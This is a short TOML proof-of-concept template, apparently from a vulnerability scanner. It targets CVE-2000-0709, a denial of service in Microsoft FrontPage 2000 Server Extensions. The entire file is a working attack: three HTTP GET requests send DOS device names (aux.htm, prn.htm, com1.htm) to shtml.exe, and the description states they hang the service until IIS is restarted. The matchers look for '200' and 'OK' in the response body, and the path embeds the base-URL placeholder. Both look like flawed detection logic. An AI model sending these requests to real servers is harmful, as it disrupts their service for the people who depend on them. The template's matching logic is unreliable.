[info]
author = "ave"
description = "通过向 shtml.exe 发送包含 DOS 设备名（如 aux.htm、com1.htm、prn.htm）的特制 HTTP 请求，可导致 FrontPage Server Extensions 挂起，停止响应所有 FrontPage 操作，需重启 IIS 服务恢复。"
id = "POC-AVE-2000-0865"
name = "Microsoft FrontPage 2000 Server Extensions shtml.exe DOS Device DoS"
severity = "medium"
tags = ["ave-2000-0865"]
vuln_id = [
    "CVE-2000-0709",
    "AVE-2000-0865",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/aux.htm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "OK",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/prn.htm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "OK",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/com1.htm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "OK",
]
